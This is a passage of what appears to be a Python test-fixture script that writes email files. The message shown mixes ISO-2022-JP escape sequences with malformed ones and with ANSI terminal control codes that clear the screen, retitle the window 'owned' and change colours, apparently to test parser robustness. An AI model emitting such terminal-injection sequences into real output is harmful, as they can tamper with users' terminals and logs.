    b"Content-Type: text/plain; charset=iso-2022-jp\r\n"
    b"Content-Transfer-Encoding: 7bit\r\n\r\n"
    b"A charset that is made of escape sequences, with some that are not its own:\r\n"
    b"\x1b$B$3$s$K$A$O\x1b(B then \x1b[2J\x1b]0;owned\x07 and \x1b$B\x1b[31m\x1b(B and an unfinished \x1b$\r\n"
    b"\x1b(J half-width \x1b(I1234\x1b(B \x1b$(D\x22\x2f\x1b(B end\r\n"
), crlf=False)

print(len([f for f in os.listdir(OUT) if f.endswith(".eml")]), "messages")
